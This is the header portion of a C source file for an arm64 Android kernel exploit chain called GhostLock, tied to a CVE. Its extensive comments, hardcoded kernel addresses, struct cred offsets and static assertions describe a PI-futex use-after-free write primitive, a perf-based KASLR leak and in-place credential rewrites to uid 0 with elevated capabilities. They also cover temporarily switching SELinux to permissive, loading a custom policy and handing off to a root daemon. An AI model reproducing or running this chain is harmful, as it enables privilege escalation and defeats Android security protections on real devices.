// glx.c - self-contained arm64 GhostLock executor (CVE-2026-43499 chain)
//          glx_p11k (i739 / intent 754): glx_p11i + raw-SETIDS hardening
//          (svc 149/147, no NPTL setxid broadcast, fail-closed Threads==1;
//           read chain / arm / delivery / stage 3 untouched)
//          glx_p4 (intent 576): fact-572 in-place cred field rewrite
//          (glx_p3 = intent 570: fact-569 sendmmsg fake-waiter fill)
//          glx_p7 (intent 630): i601 device-tested write chain  +  i552i
//          delivery leg  +  fact-628 engineering fixes
//
//   ONE static binary, syscall-direct, no PT_INTERP:
//     S0  preflight (read-only) / D solve (validated + 5 retries) / P0 select /
//         pmsg vmap / delta gate
//     R1..R5 read chain (tcp_mem pivot)   R3' task+ptracer_cred
//     WC1..WC3 in-place capability-field writes (cap_permitted/eff/bset = V;
//           NO value==0 write) -- SID stays u:r:shell:s0 (fact 572/609/626)
//     N9 permissive -> SETIDS (setresgid/setresuid) -> N9V read -> L1 load ->
//     N10 enforcing write-back (read back through sel_read_enforce(state[1]))
//     setcon shell + uid0 abstract-socket daemon   C1 Termux(UA27) connect
//     VR (post-exec cap_bset re-check)   optional --deliver-exec rootd handoff
//
// Two backends for the 8-byte write / kernel read:
//   --mode qemu   : /proc/glctl (gl_rw.ko faithful simulator + kernel oracle).
//                   Ground truth for D and for the pmsg vmap comes from the
//                   module (the QEMU analogue of the device perf leak).
//   --mode device : the real primitive -- 3-thread PI-futex ring + stale
//                   rt_mutex_waiter + sendmmsg fill + sched_setattr trigger.
//                   D comes from perf REGS_INTR; the pmsg vmap comes from the
//                   perf leak of __arch_copy_from_user (fact 455).
//
// DEVICE STATUS (glx_p4): the pselect6 spray is GONE.  The fake waiter is now
// laid down by the fact-569 two-message sendmmsg issued by T itself
// (used_address memcpy -> stack_base+0x3C80..0x3C98 from the sockaddr,
// iovstack copy -> stack_base+0x3CA0..0x3CD0 from three iovecs).  The one
// uncontrolled 8B (0x3C98..0x3CA0 = pi_tree.__rb_parent_color, forced 0x80)
// does not overlap any field the chain consumes.  Every shot asserts
// sendmmsg()==1 and refuses to trigger when the fill did not land
// (SPRAY_DOMAIN_LOST) instead of oopsing.  NOT executed on hardware.
#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <stdarg.h>
#include <stdint.h>
#include <stddef.h>
#include <string.h>
#include <errno.h>
#include <unistd.h>
#include <fcntl.h>
#include <signal.h>
#include <sched.h>
#include <pthread.h>
#include <time.h>
#include <ctype.h>
#include <dirent.h>
#include <sys/mman.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <sys/syscall.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <sys/un.h>
#include <sys/ioctl.h>
#include <sys/prctl.h>
#ifndef PR_GET_SECUREBITS
#define PR_GET_SECUREBITS 28
#endif
#ifndef PR_SET_SECUREBITS
#define PR_SET_SECUREBITS 27
#endif
#include <sys/fsuid.h>
#include <sys/resource.h>
#include <poll.h>
#include <linux/futex.h>
#include <linux/perf_event.h>
#include <linux/capability.h>

#include "qtable.h"
#include "dtable.h"
/* glx_p11i (intent 744): stage 3 -- Shizuku root server (fork+exec) */
#include "shz_launch.h"

/* ------------------------------------------------------------------ consts */
/* glx_p5 (intent 598) -- the nine-item patch list from 591's P5_PATCHLIST:
 *   P1 [must]  T identity nonce (prctl PR_SET_NAME) + R3C strcmp, R2 cpu assert
 *   P2 [must]  shotlog_verify becomes a gate (res); VR_TARGET_UNKNOWN is NOT a
 *              pass any more, RESULT carries vr=
 *   P3 [must]  post-exec probe also asserts cap_permitted >= 0x6
 *   P4         P0 moves into our own pmsg page (no __log_buf / dmesg footprint)
 *   P5         L1/N10 failure paths re-issue w8(p0+9, state+1) to restore
 *              enforcing, and print enforce= on every failure
 *   P6         W_PRE rejects a non-8-aligned cred (4 mod 8 used to silently
 *              write V's high half into cap_effective)
 *   P8         single shot-accounting story (11 chain-critical vs ledger 15/17)
 *   P9         keep the post-exec VR probe; never "fix" caps after execve
 * The V-offset question (P7) is unchanged: V = B+0x3006, see the block below.
 *
 * glx_p6 items merged on top of P1..P9 (planner correction, 594):
 *   ① --deliver-exec=PATH  : optional execve(rootd) handoff at the very end of
 *                            delivery() (default off, device+uid0 only)
 *   ② C1 evidence split    : c1_shell=LIVE|PARTIAL|SKIP, c1_kernel/c1_init=
 *                            STATIC, post=<rc> (POST= is the only live proof)
 *   ③ no UA27 client       : C1_SKIP, does not add g_fails (never burns a run)
 *   ④ L1 blob self-check   : size/vers/magic/sha256 re-verified right before
 *                            load_policy (never reads /sys/fs/selinux/policy)
 *
 * glx_p6 (intent 608) -- the four gaps that decide whether the next device run
 * is wasted or its evidence is admissible:
 *   ① POST= live channel    : the reader shm grows a c1_post field; after the
 *                            reply is written the shell daemon polls the
 *                            listener ONE more time (SO_RCVTIMEO 3 s) and reads
 *                            "POST=<rc>".  c1_shell=LIVE only on a POST=0 that
 *                            arrived on that second connection.
 *   ② one timeout budget    : the C1 child op and the C1_REPLY op are both
 *                            bounded by 5 000 ms, the parent waits 10 000 ms
 *                            for every op (594 C-4: 8 000 + 5 000 = 13 s > 10 s
 *                            was a real overrun).  _Static_assert + a runtime
 *                            print of the worst path; a C1 timeout is a SKIP,
 *                            never DELIVERY_FAIL.
 *   (i730) VR A/B verdict  : the old VR_NEG_DROPBOX / VR_INIT_SHELL_DENIED
 *                            assertions were wrong PATH assumptions
 *                            (fact 732) and are replaced by a pre/post
 *                            A/B + identity invariants; RESULT carries
 *                            vr_ab=.
 *   ⑤ P1 fail-closed retry  : R2_CPU_PIN / R2_CURR / R3C_COMM re-read up to
 *                            5 times, 1 ms apart, before aborting -- a
 *                            scheduling wobble must not burn a device run.
 *   ⑥ parent=(pc&~3) docs   : fact 607① -- a 4-mod-8 target still gets
 *                            parent = target-8 and the primary store still
 *                            lands on target; the guard stays as a zero-cost
 *                            belt-and-braces check.  The only branch that can
 *                            move the store to target-8 (__rb_change_child's
 *                            parent->rb_left == node) is deterministically
 *                            excluded by P4's self-page P0.
 *
 * glx_p7 (intent 630) -- the two divergent glx trees are merged here:
 *   A. write chain is i601's DEVICE-TESTED one: only WC1..WC3 (value=V, never
 *      0) + N9 + SETIDS + N9V.  i552i's W1..W4 zero-write cred path (fact 609:
 *      first zero shot => SIGKILL + ~1 min panic) is NOT present.
 *   B. delivery leg is i552i's (fact 615): --deliver-exec handoff, HANDOFF_PRE
 *      four assertions, C1 POST= second-connection live channel, one
 *      self-consistent timeout budget, P1 bounded retries, pre/post A/B column.
 *   C. fact 628 three engineering fixes:
 *      1) reader_stop(): V4_OP_STOP + waitpid + close(@glx-shell-454) on every
 *         exit path (atexit + PR_SET_PDEATHSIG) -- no orphan listener.
 *      2) dev_solve_D_checked(): range/alignment/segment validation plus up to
 *         D_RETRY_MAX=5 attempts, each confirmed by a second independent
 *         sampling window; R1 retries up to 5 times and a bogus D can only
 *         end in a safe CHAIN_ABORT (the fact-614 pseudo-pco 0x2c257 / 0x4237e
 *         never becomes a shot into a wrong address).
 *      3) order fixed as N9 -> SETIDS -> (N9V read) -> L1_LOAD -> N10, and the
 *         N10 read-back is the GhostLock read of selinux_state (state[1] ==
 *         enforcing, "sel_read_enforce"), not the selinuxfs file/status page.
 *   D. fact 645/646 delivery contract: execve(path, {path, "--audit-log=...",
 *      NULL}, NULL) -- default whitelist 10369, envp NULL, HANDOFF_PRE stays a
 *      strict subset of rootd's own startup assertions.
 *
 * glx_p11 (intent 696) -- three minimal fixes on top of glx_p10, from fact 695
 * (all three were pure software defects, the two device runs of 693 aborted on
 * them):
 *   ① PERM success no longer falls into the perm_n9_fallback label.  p10 ran
 *      off the end of the PERM block into the label, whose first statement is
 *      "reject a run without --perm-fallback=n9" => SETIDS/setresuid never ran.
 *      Now: if (perm_continue_to_setids()) goto perm_fallback_done;
 *   ② WC1..WC5 and PERMNODE/PERM_HI are write -> readback -> re-issue (<= 3
 *      tries).  A silent no-op store (fact 260/692: returns 0, target
 *      unchanged, retry-safe) no longer aborts the chain; WC_CAPS stays a gate
 *      only after the retries are exhausted.
 *   ③ --perm-armed (third state): read back perm_map.node==planned X and
 *      highbit==planned W (fact 694's armed shape) plus the fake node's
 *      PERM_IMG content; then skip the two arming writes and go straight to
 *      SETIDS.  Mismatch aborts cleanly before SETIDS.
 *   + PERMSET in-process forensics: uid0 stat/open/read/sha256 of the 0600
 *      system:system fixture /data/system/entropy.dat (fact 668's 789a3e95...)
 *      and /proc/self/status, emitted BEFORE a --stop-after=permset exit.
 *
 * glx_p11g (intent 733, fact 732) -- Phase-B evidence corrected.  The two
 * glx_p11f "negative controls" were wrong PATH assumptions, not policy leaks:
 *   ① /data/system/dropbox is a DIRECTORY (drwx------ system:system): with
 *      uid0 + CAP_DAC_OVERRIDE|CAP_DAC_READ_SEARCH open() legitimately
 *      succeeds and read() returns -EISDIR (-21) -- that is not -EACCES and
 *      it is not a SELinux verdict;
 *   ② on this build /init is a root:shell 0750 SYMLINK to /system/bin/init,
 *      so the shell identity can read it (rc=0) -- /init is not a
 *      "restricted file" here.
 * Both assertions are DELETED.  The replacement evidence is:
 *   A) a genuine pre/post A/B on ONE path: the reader child, forked before
 *      the cred stage (uid2000 / u:r:shell:s0), is denied -13 EACCES on the
 *      VR target, and the post-cred uid0 process opens+reads that same file;
 *   B) identity/pose invariants, read ONLY through capget(2)/prctl(2) (never
 *      a GhostLock read_window, which would side-store at A-8): ctx still
 *      u:r:shell:s0, enforcing=1, CapEff⊇0xC6, CapBnd⊇0xC6 with no bit above
 *      CAP_LAST_CAP, securebits unchanged vs the pre-cred baseline.
 * rootd_zd's negctl assertion is fixed in the same DAC口径: a path that is
 * missing / is a directory / is readable because of the DAC caps is either
 * SKIP or PASS, never a hard abort on a wrong path assumption.
 */
#define VERSION "glx-2.15 (glx_p11n/i775 = glx_p11m/i766 + i775 delivery-leg fix: the LISTENING predicate is evaluated on every poll round, a listening uid0 rootd is never killed, and every timeout prints a specific failure gate; read chain/arm/SETIDS/stage3 otherwise byte-identical)"
#define LOG_DEVICE "/data/local/tmp/glx.log"
#define LOG_QEMU   "/glx.log"
#define GLCTL      "/proc/glctl"
#define PMSGCTL    "/proc/pmsgctl"

#define D_TEXT        0xffffffc010080000UL
#define D_INIT_CRED   0xffffffc012c7edb0UL
#define D_INIT_TASK   0xffffffc012c71700UL
#define D_STATE       0xffffffc012eee000UL
#define D_PCO         0xffffffc012bb0078UL  /* &__per_cpu_offset[0]   */
#define D_RUNQUEUES   0xffffffc0128a8c80UL
#define D_TCP_ENT     0xffffffc012c6c720UL  /* tcp_mem ctl_table entry */
#define D_OOPS_CXT    0xffffffc012bd8928UL

#define D_OFF_REAL    0x800UL   /* task->real_cred  */
#define D_OFF_CRED    0x808UL   /* task->cred       */
#define D_OFF_COMM    0x818UL   /* task->comm       */
#define D_OFF_PTRACER 0x7f8UL   /* task->ptracer_cred */
#define D_RQ_CURR     0x8d8UL   /* rq->curr         */
#define D_CRED_EUID   0x14UL    /* cred->euid|egid  */

#define DOM_KERNEL "u:r:kernel:s0"
#define DOM_SHELL  "u:r:shell:s0"
#define DOM_APP27  "u:r:untrusted_app_27:s0"

#define LINK_STEXT 0xffffffc010081000UL
#define LINK_ETEXT 0xffffffc0118b0000UL

#define PERF_NREGS 33
#define VWINDOW_LO 0xffffffc010000000UL
#define VWINDOW_HI 0xffffffc020000000UL

/* i492: perf ring size must be a POWER OF TWO.  kernel/events/core.c (5.4)
 * __perf_event_mmap_aux / perf_mmap(): "if (!ring_pages) return -EINVAL;
 * if (ring_pages & (ring_pages - 1)) return -EINVAL;"  The device refuses
 * 65/257 outright; 64/256 are accepted.  Keep the define, never the odd size. */
#define RING_PAGES_D    64      /* dev_solve_D           (was 65) */
#define RING_PAGES_PMSG 256     /* dev_pmsg_leak         (was 257) */

/* i510: the pmsg vmap page IS the fake rt_mutex (waiter->lock).  The kernel
 * touches four fields there: wait_lock(u32@0), waiters.rb_root.rb_node(@8),
 * waiters.rb_leftmost(@0x10), owner(@0x18) -- 0x20 bytes total, and it writes
 * back into them (trylock, rb_enqueue), so every shot needs a pristine copy.
 * We therefore fill the whole ring with ZEROS: an all-zero page is a legal
 * rt_mutex (wait_lock=0 -> trylock succeeds, empty waiters, owner=NULL), and a
 * uniform fill is invariant under the ring cursor / wrap / rotation. */
#define PMSG_DATA_LEN     0xFFFF4UL     /* persistent_ram data area        */
#define PMSG_OBJ_SIZE     0x20UL        /* struct rt_mutex, DEBUG off      */
#define PMSG_OBJ_OFF      0x2000UL      /* fact 539: obj = base+0x2000
                                         * (data off 0x1FF4, 8-aligned)      */
#define PMSG_DEFAULT_OFF  0x80000UL     /* legacy qemu-harness fallback only */
#define PMSG_CURSOR_GAP   0x80000UL     /* legacy, unused on device          */

/* ================= intent 662: per-SID (per-type) permissive ================
 * policydb->permissive_map lives in the static selinux_ss object:
 *   selinux_state+0x18  -> selinux_ss*      (selinux_ss_init: *ss = &selinux_ss)
 *   selinux_ss+0x08     -> struct policydb  (embedded; struct selinux_ss starts
 *                                            with `struct sidtab *sidtab`)
 *   policydb+0x1C8      -> permissive_map{node; u32 highbit; 4B pad}
 * so the absolute fields are ss+0x1D0 (node) / ss+0x1D8 (highbit), NOT
 * selinux_state+0x1E8 (that is the *field that holds the pointer*, fact 659's
 * arithmetic slipped on this).  The 8-byte store at +0x1D8 covers highbit and
 * the ebitmap tail padding only; size_t len at policydb+0x1D8 (= ss+0x1E0) is
 * untouched (E2_perm_map_offsets.txt). */
#define PERM_SS_LINK       0xffffffc0132072b0UL /* System.map `b selinux_ss`   */
#define PERM_NODE_OFF      0x1D0UL              /* ss+0x8+0x1C8                */
#define PERM_HIGHBIT_OFF   0x1D8UL              /* ss+0x8+0x1D0                */
#define PERM_NODE_VMAP_OFF 0x100UL              /* X - pmsg vmap base (data    */
                                                /* offset 0xF4)                */
#define PERM_HI_VMAP_OFF   0x3000UL             /* W - pmsg vmap base          */
#define PERM_STARTBIT      0x580UL              /* 1408: shell 1464 -> bit 56  */
#define PERM_TYPE_SHELL    1464
#define PERM_SHELL_BIT     (PERM_TYPE_SHELL - 1408)   /* 56 */
#define PERM_TYPE_UA27     1498
#define PERM_UA27_BIT      (PERM_TYPE_UA27 - 1408)    /* 90  */
#define PERM_UA27_PERMISSIVE 0   /* 0: Termux stays enforcing (zero-delta leg) */
#define PERM_HI_MIN        1498UL
_Static_assert(PERM_SHELL_BIT >= 0 && PERM_SHELL_BIT < 0x180,
               "shell type must live in the first ebitmap node");
_Static_assert(PERM_UA27_BIT >= 0 && PERM_UA27_BIT < 0x180,
               "untrusted_app_27 must live in the first ebitmap node");
_Static_assert((PERM_SHELL_BIT / 64) < 6, "maps[] index bounded (no mapsize)");
_Static_assert((PERM_UA27_BIT / 64) < 6, "maps[] index bounded (no mapsize)");
_Static_assert((PERM_HI_VMAP_OFF & 7) == 0, "W must be 8-aligned");

/* i492: device delivery blob = i448/v3_delta.bin (authoritative 104-class CIL,
 * two EXEC_PACKAGE_v3 rows).  Asserted byte-exact before any load_policy. */
#define DEV_DELTA_SIZE   1676635UL
#define DEV_DELTA_SHA256 "8f5e7b21fead34282432b4fbb03f1aa0bb783f08c3a0a1e48a249d7f77ac4ade"
/* fact 518: same bytes as the shipped v3 blob; MD5 is the v4 gate too. */
/* fact 551/553: glx_p1 already carries this expected value (the in-binary md5
 * implementation prints fcb4cfd6.. for the device blob while the host md5sum is
 * f96bf6b8..); keep glx_p1's fixed constant so the rebuild stays byte-equal. */
#define DEV_DELTA_MD5    "fcb4cfd6ca0c0eb2dd132c94f5c08578"
#define DEV_POLICYVERS   30
#define DEV_CLASSES      104     /* /sys/fs/selinux/class entries on C.53 */
#define POLMAGIC         0xf97cff8cUL

/* device paths (overridable with --delta / --vr-target) */
#define DEV_DELTA_PATH "/data/local/tmp/p"   /* 17 chars + NUL, fits 18B slot */
#define DEV_VR_TARGET  "/data/system/entropy.dat"

/* ------------------------------------------------------- glx_p4 cred stage
 * fact 572, decided: the delivery leg needs uid0 AND the shell SELinux domain,
 * so the cred object is rewritten IN PLACE (the task->real_cred/cred pointers
 * are never touched):
 *
 *   W1 cred+0x04 = 0        uid  = gid  = 0
 *   W2 cred+0x0c = 0        suid = sgid = 0
 *   W3 cred+0x14 = 0        euid = egid = 0
 *   W4 cred+0x1c = 0        fsuid= fsgid= 0
 *   W5 cred+0x38 = V        cap_effective
 *   W6 cred+0x40 = V        cap_bset
 *
 * cap_permitted (+0x30) is NOT written: execve rebuilds pP' = cap_bset |
 * cap_inheritable (C.53 cap_bprm_set_creds / handle_privileged_root), so only
 * cap_bset has to survive the exec boundary.
 *
 * WHY V AND NOT THE LITERAL 0x6/0xc6  (glx_p4 finding, C.53 instruction-level)
 * The GhostLock 8B write is rb_erase() case-1, and C.53 rb_erase+0x74 is
 *     str x10, [x9]          ; *(child) = node->__rb_parent_color == target-8
 * where child = node->rb_right = the value we want to write.  A non-zero value
 * therefore causes a SECOND 8-byte store to address `value`.  Writing the
 * literal 0x6 / 0xc6 would store to kernel address 0x7 / 0xc7 -> translation
 * fault -> oops -> PANIC_ON_OOPS board self-reset (~5 s).  Only value==0 is a
 * clean single store.
 * So the two capability words are written with a controlled writable kernel
 * address V = g_fake_lock + CRED_CAPVAL_DELTA, chosen with V % 8 == 6:
 *   - cap_effective low 32 bits = V & 0xffffffff (bits 1 and 2 = DAC_OVERRIDE
 *     and DAC_READ_SEARCH are set because V % 8 == 6); cap_capable() only reads
 *     cred+0x38 (ldr w8,[x8,#56]) so the DAC bits are live immediately;
 *   - after execve pP' = pE' = cap_bset | cap_inheritable = V, so the DAC bits
 *     survive (fact 572's QEMU variant matrix requires bset to carry 0x6);
 *   - the unavoidable secondary store *(V) = target-8 lands inside our own
 *     zero-filled ramoops page, which is re-zeroed before every shot.
 * Extra capability bits present in V are harmless: SELinux still gates every
 * capability use in the shell domain.
 */
#define GLX_CRED_MODE 2
#define CRED_OFF_UID_GID      0x04UL
#define CRED_OFF_SUID_SGID    0x0cUL
#define CRED_OFF_EUID_EGID    0x14UL
#define CRED_OFF_FSUID_FSGID  0x1cUL
#define CRED_OFF_CAP_PERM     0x30UL
#define CRED_OFF_CAP_EFF      0x38UL
#define CRED_OFF_CAP_BSET     0x40UL
#define CRED_OFF_CAP_INH      0x28UL   /* cap_inheritable  (p10: i552u WC4) */
#define CRED_OFF_CAP_AMB      0x48UL   /* cap_ambient      (p10: i552u WC5) */
#define CRED_CAPVAL_DELTA     0x810C6UL  /* g_fake_lock + 0x80000 (bit19
                                          * CAP_SYS_PTRACE) + 0x1000 (bits 12/13)
                                          * + 0xC6 (bits 1,2,6,7); V%8==6.
                                          * bit19 is a hedge: if the NPTL setxid
                                          * broadcast does not reach T, the later
                                          * sched_setattr(T) still passes
                                          * ptrace_may_access(). */
#define CRED_CAP_BITS         0x6UL      /* CAP_DAC_OVERRIDE|CAP_DAC_READ_SEARCH */
#define CRED_CAPS_FULL        0xC6UL     /* + CAP_SETGID|CAP_SETUID            */
#define CRED_WRITE_SHOTS      5          /* WC1..WC5 perm/eff/bset/inh/amb (p10) */
/* glx_p11 (intent 696 fix ②): one GhostLock store can be a silent no-op
 * (fact 260 first shot, fact 692 shot 11) -- classified retry-safe.  Each
 * capability write is now write -> readback -> compare -> re-issue, at most
 * this many times before the run gives up. */
#define GLX_W8_TRIES          3
#define CRED_READ_SHOTS       5          /* R1..R5 */
#define CHAIN_CRED_SHOTS      (CRED_READ_SHOTS + CRED_WRITE_SHOTS)   /* 8 */
#if GLX_CRED_MODE != 2
#error "glx_p4 ships exactly one cred mode: in-place field rewrite (mode 2)"
#endif
_Static_assert((CRED_CAPVAL_DELTA & 7) == 6, "cap value V must be 6 mod 8");
_Static_assert(CRED_OFF_CAP_EFF == 0x38 && CRED_OFF_CAP_BSET == 0x40,
               "struct cred capability offsets drifted (fact 572)");
_Static_assert(CRED_OFF_UID_GID == 4 && CRED_OFF_SUID_SGID == 0xc &&
               CRED_OFF_EUID_EGID == 0x14 && CRED_OFF_FSUID_FSGID == 0x1c,
               "struct cred id-pair offsets drifted (fact 572)");
_Static_assert(CRED_WRITE_SHOTS == 5, "five capability-field writes (no zero write)");
_Static_assert(CHAIN_CRED_SHOTS == 10, "cred stage = 5 reads + 5 cap writes");

/* ------------------------------------------------- glx_p5 compile-time门
 * P8 (intent 598; re-based on the i601 write chain in glx_p7): ONE accounting
 * story, three numbers, all consistent:
 *     8  = chain-critical shots (5 reads R1..R5 + 3 cap writes WC1..WC3)
 *    11  = do_chain() runtime ledger (+ R3C identity read + N9 / N9V)
 *    13  = delivery() runtime ledger (+ N10 / N10V after the policy load)
 * The ledger is now a GATE (P2): a MISMATCH is a res(...,0) and the run can
 * never print RESULT=PASS.  The strings below are shared by production code
 * and the host unit test so the three numbers cannot drift apart silently. */
static const char *const SHOTLEDGER_CHAIN[] = {
    "R1", "R2", "R3P", "R3C", "R4", "R5",
    "WC1_cap_perm", "WC2_cap_eff", "WC3_cap_bset",
    "WC4_cap_inh", "WC5_cap_amb",
    "PERM_PRE", "PERM_VRF", "PERMNODE", "PERM_HI", "PERM_SET"
};
#define SHOTLEDGER_CHAIN_N (int)(sizeof(SHOTLEDGER_CHAIN)/sizeof(SHOTLEDGER_CHAIN[0]))
/* --no-ambient: fork-only tier (no execve anywhere) -> 14 tags */
static const char *const SHOTLEDGER_CHAIN_NOAMB[] = {
    "R1", "R2", "R3P", "R3C", "R4", "R5",
    "WC1_cap_perm", "WC2_cap_eff", "WC3_cap_bset",
    "PERM_PRE", "PERM_VRF", "PERMNODE", "PERM_HI", "PERM_SET"
};
#define SHOTLEDGER_CHAIN_NOAMB_N \
    (int)(sizeof(SHOTLEDGER_CHAIN_NOAMB)/sizeof(SHOTLEDGER_CHAIN_NOAMB[0]))
/* the delivery leg issues no GhostLock shot of its own: same ledger */
#define SHOTLEDGER_DELIVERY        SHOTLEDGER_CHAIN
#define SHOTLEDGER_DELIVERY_N      SHOTLEDGER_CHAIN_N
#define SHOTLEDGER_DELIVERY_NOAMB  SHOTLEDGER_CHAIN_NOAMB
#define SHOTLEDGER_DELIVERY_NOAMB_N SHOTLEDGER_CHAIN_NOAMB_N
_Static_assert(SHOTLEDGER_CHAIN_N == 16, "chain ledger = 6 reads + 5 cap writes + 5 PERM stages");
_Static_assert(SHOTLEDGER_CHAIN_NOAMB_N == 14, "fork-only ledger = 6 reads + 3 cap writes + 5 PERM stages");

/* P7 / 595 cap-radius of V = g_fake_lock + CRED_CAPVAL_DELTA = B + 0x830C6
 * (B = 1MB-aligned pmsg vmap base, g_fake_lock = PMSG_OBJ_OFF = 0x2000,
 *  CRED_CAPVAL_DELTA = 0x810C6; fact 622: every one of these offsets lies in
 *  the pmsg 1MB vmap window and pmsg does NOT share a page with the console):
 *   bit 1  CAP_DAC_OVERRIDE      yes (0xC6)  -- REQUIRED by the SELinux delta
 *   bit 2  CAP_DAC_READ_SEARCH   yes (0xC6)  -- REQUIRED by the SELinux delta
 *   bit 6  CAP_SETGID            yes (0xC6)  -- REQUIRED by SETIDS setresgid()
 *   bit 7  CAP_SETUID            yes (0xC6)  -- REQUIRED by SETIDS setresuid()
 *   bit 3  CAP_FOWNER            NO (V&8==0) -- the one delta perm V cannot
 *                                               carry; not needed after SETIDS
 *   bit 12 CAP_NET_ADMIN         yes (0x1000)  -- no shell allow; only "live"
 *   bit 13 CAP_NET_RAW           yes (0x3000)     inside the N9->N10 permissive
 *                                               window, where nothing
 *                                               privileged is executed
 *   bit 19 CAP_SYS_PTRACE        yes (0x80000) -- hedge: if the NPTL setxid
 *                                               broadcast does not reach T, the
 *                                               later sched_setattr(T) still
 *                                               passes ptrace_may_access()
 *   bits 20-31                   from B's bits 20-31 (KASLR/vmalloc), same
 *                                "enforcing blocks, permissive window" caveat
 *   bits 32-37 (cap[1] 0-5)      from V's high word (vmalloc high word); 38-40
 *                                are ignored (CAP_LAST_CAP=37 on C.53)
 * ONLY bits 1,2,6,7 are relied on; bit19 is a documented hedge; nothing else
 * may be relied on and no privileged action may be inserted into N9->N10. */
#define CRED_CAPVAL_OFF_IN_PAGE (PMSG_OBJ_OFF + CRED_CAPVAL_DELTA)   /* 0x830C6 */
_Static_assert((CRED_CAPVAL_OFF_IN_PAGE & 7) == 6,
               "V must be 6 mod 8 so bits 1/2 (DAC) are set");
_Static_assert((CRED_CAPVAL_OFF_IN_PAGE & CRED_CAP_BITS) == CRED_CAP_BITS,
               "DAC_OVERRIDE|DAC_READ_SEARCH must be in V");
_Static_assert((CRED_CAPVAL_OFF_IN_PAGE & 8) == 0,
               "CAP_FOWNER (bit3) must NOT be in V (delta-only perm)");
_Static_assert((CRED_CAPVAL_OFF_IN_PAGE >> 12) & 1 &&
               (CRED_CAPVAL_OFF_IN_PAGE >> 13) & 1,
               "documented cap radius: bits 12/13 come from the offset");
_Static_assert(CRED_CAPVAL_OFF_IN_PAGE >= PMSG_OBJ_OFF + PMSG_OBJ_SIZE,
               "V's secondary store must not clobber the fake rt_mutex");
_Static_assert(CRED_CAPVAL_OFF_IN_PAGE >= 0xC,
               "pmsg data area starts at base+0xC (fact 539)");
_Static_assert(CRED_CAPVAL_OFF_IN_PAGE + 8 <= PMSG_DATA_LEN,
               "V's secondary store *(V)=target-8 must stay in our own page");

/* ------------------------------------------------------------------ state */
static int   g_qemu;            /* 1 = gl_rw.ko backend                */
static int   g_dev;
static int   g_fails, g_shots;
/* P1: T's identity (PR_SET_NAME nonce).  Only the victim thread ever carries
 * this name; R3C compares it so that a foreign rq->curr aborts the run before
 * any cred byte is written. */
static char  g_t_nonce[16];     /* <= 15 chars + NUL (TASK_COMM_LEN = 16) */
/* P2: the VR verdict is reported on the RESULT line.  "UNKNOWN" means no
 * root-only fixture was found, which is NOT evidence of root (hint 483 #2). */
static const char *g_vr_verdict = "UNKNOWN";
/* P5: set once N9 has flipped enforcing to 0, so every later failure can
 * restore it before returning. */
static int   g_enforce_off;
/* glx_p6 item ① (594): optional uid0 -> rootd handoff.  Default OFF; the
 * image replacement destroys the futex ring and the reader shim, so it must be
 * the very last thing delivery() does. */
static const char *g_deliver_exec;
/* ---- glx_p10 (intent 676): the merged i552u delivery legs ---------------- */
static int   g_deliver_fork;      /* path A: embedded rootd_main() in a fork */
static int   g_zd_chan;           /* 0 legacy unix C1 / 1 tcp / 2 file       */
static const char *g_zd_daemon;   /* standalone rootd_zd (exec mode)         */
static const char *g_zd_secret_file = "/data/data/com.termux/files/home/zd_secret";
/* i701 (glx_p11d): provision the shared secret AS this uid (Termux).
 * Rationale: the fork child holds CapEff=V (0xC6 low bits) which does NOT
 * include CAP_CHOWN (bit 0), so it cannot chown a root-created file to
 * Termux; and Termux itself cannot create a file in /data/local/tmp
 * (TE L70053 has no create/add_name, DAC 0771 other=--x -- i552y §3(b)).
 * Dropping to uid 10369 in a throw-away fork child makes the file
 * owner-Termux 0600 by construction: only Termux can read it, and rootd
 * reads it with CAP_DAC_OVERRIDE|CAP_DAC_READ_SEARCH (-1 disables). */
static int   g_zd_secret_uid = 10369;
static int   g_zd_port_live = -1;   /* port learned from ROOTD|LISTENING */
static const char *g_zd_dir        = "/data/data/com.termux/files/home/zd_chan";
static const char *g_zd_tag        = "glx10";
static int   g_zd_auto;           /* --zd=auto: probe IP, else file        */
static int   g_zd_port;           /* 0 = ephemeral; --zd-port=N pins it   */
static int   g_zd_client_selftest; /* i706: drive the channel as uid 10369  */
static pid_t g_zd_pid = -1;
static int   g_stop_hit;          /* --stop-after=deliver-{tcp,file} reached */
static int   g_ambient = 1;       /* WC4/WC5 on by default (fork+exec tier)  */
static int   g_perm_fallback_n9;  /* --perm-fallback=n9                      */
static int   g_perm_force;        /* --perm-force: same-boot re-arm          */
static int   g_perm_armed;        /* --perm-armed: 3rd state, map is armed   */
static int   g_ledger_off;        /* readback reads make the ledger advisory */
static int   g_w8_retry_n;        /* silent no-ops recovered by w8_verified  */
static int   g_w8_attempts;       /* last w8_verified attempt count (UT)     */
static int   g_perm_skip;         /* ambiguous S: skip PERM, use the fallback */
static int   g_n9_used;           /* the N9 fallback actually fired          */
extern int rootd_main(int argc, char **argv);
/* glx_p7: argv[1] for rootd (fact 645③).  Default ON; argv[1] only, envp NULL. */
static const char *g_deliver_audit = "/data/local/tmp/rootd_audit.log";
static int   g_deliver_audit_off;
/* glx_p6 item ② (594 C-3/C-4): C1 evidence dimensions.  Only c1_shell can be
 * live; kernel/init are policy_static evidence by construction (fact 593). */
static const char *g_c1_shell = "UNSET";
static int   g_c1_post = -999;
/* glx_p6 item ①: where the POST=<rc> came from.  0 = nowhere, 1 = the second
 * connection after the reply (LIVE-capable), 2 = the field embedded in the
 * first report (an old client that cannot do the second connect: PARTIAL). */
static int   g_c1_post_src;
/* i730 (intent 733): the old "negative control" column is GONE.  glx_p11f
 * gated Phase B on two wrong path assumptions (fact 732): a directory read
 * returns -EISDIR (-21), not -EACCES, and this build's /init is a
 * root:shell 0750 symlink the shell identity CAN read.  The replacement
 * verdict is a real pre/post A/B on one file plus identity invariants; the
 * RESULT line carries it as vr_ab=. */
static const char *g_vr_ab = "UNSET";
/* Pre-cred pose baseline, captured in vr_pre_probe() while the process is
 * still uid2000/u:r:shell:s0.  Read only through prctl(2) -- never through a
 * GhostLock read (read_window(A) side-stores at A-8, fact 697). */
static unsigned long g_bnd_pre, g_secbits_pre;
static int g_pose_pre_done;
/* shot ledger state -- helpers are defined after L()/res() */
#define SHOTLOG_MAX 40
static const char *g_shotlog[SHOTLOG_MAX];
static int   g_shotlog_n;
static int   g_shotlog_bad;
static int   g_round = 1;
static int   g_verbose;
static int   g_selftest;        /* --selftest: S0 read-only, no write shots  */
